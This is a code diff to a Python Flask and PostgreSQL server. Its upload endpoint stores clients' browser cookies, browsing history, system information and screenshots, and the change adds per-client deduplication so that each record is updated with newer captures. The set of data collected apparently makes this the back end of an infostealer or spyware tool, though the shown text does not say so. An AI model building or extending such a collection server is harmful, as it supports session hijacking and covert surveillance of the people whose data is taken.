@@ -76,6 +76,7 @@ def init_db():
                 cur.execute('''
                     CREATE TABLE IF NOT EXISTS users (
                         id SERIAL PRIMARY KEY,
+                        client_id TEXT UNIQUE,
                         username TEXT,
                         cookies JSONB,
                         history JSONB,
@@ -104,35 +105,36 @@ def cleanup_old_data(days=3):
         logger.error(f"Cleanup failed: {e}")
         return 0
 
-def insert_user(username, cookies, history, system_info, screenshot_bytes, timestamp):
+def insert_or_update_user(client_id, username, cookies, history, system_info, screenshot_bytes, timestamp):
     try:
         with get_conn() as conn:
             with conn.cursor() as cur:
-                query = """
-                    INSERT INTO users
-                    (username, cookies, history, system_info, screenshot, timestamp)
-                    VALUES (%s, %s, %s, %s, %s, %s)
-                    RETURNING id
-                """
-                cur.execute(
-                    query,
-                    (
-                        username,
-                        json.dumps(cookies),
-                        json.dumps(history),
-                        json.dumps(system_info),
-                        screenshot_bytes,
-                        timestamp
-                    )
-                )
+                cur.execute("SELECT id, timestamp FROM users WHERE client_id=%s", (client_id,))
                 row = cur.fetchone()
-                if row and "id" in row:
-                    conn.commit()
-                    return row["id"]
-                logger.error("No ID returned from INSERT")
-                return None
+                if row:
+                    if timestamp > row["timestamp"]:
+                        cur.execute("""
+                            UPDATE users SET
+                                username=%s,
+                                cookies=%s,
+                                history=%s,
+                                system_info=%s,
+                                screenshot=%s,
+                                timestamp=%s
+                            WHERE client_id=%s
+                            RETURNING id
+                        """, (username, json.dumps(cookies), json.dumps(history), json.dumps(system_info), screenshot_bytes, timestamp, client_id))
+                        return cur.fetchone()["id"]
+                    else:
+                        return row["id"]
+                else:
+                    cur.execute("""
+                        INSERT INTO users (client_id, username, cookies, history, system_info, screenshot, timestamp)
+                        VALUES (%s,%s,%s,%s,%s,%s,%s) RETURNING id
+                    """, (client_id, username, json.dumps(cookies), json.dumps(history), json.dumps(system_info), screenshot_bytes, timestamp))
+                    return cur.fetchone()["id"]
     except Exception as e:
-        logger.exception("Database insert failed")
+        logger.exception("Database insert/update failed")
         return None
 
 # --- Initialize DB ---
@@ -229,6 +231,7 @@ def api_upload():
         logger.error(f"Invalid JSON: {e}")
         return jsonify({"error": "invalid json"}), 400
 
+    client_id = data.get("clientId", "unknown")
     username = data.get("username", "unknown")
     cookies = data.get("cookies", [])
     history = data.get("history", [])
@@ -246,7 +249,7 @@ def api_upload():
             logger.error(f"Screenshot processing failed: {e}")
 
     timestamp = datetime.now(timezone.utc)
-    new_id = insert_user(username, cookies, history, system_info, screenshot_bytes, timestamp)
+    new_id = insert_or_update_user(client_id, username, cookies, history, system_info, screenshot_bytes, timestamp)
     if new_id is None:
         return jsonify({"error": "db insert failed"}), 500
     return jsonify({"status": "ok", "id": new_id})
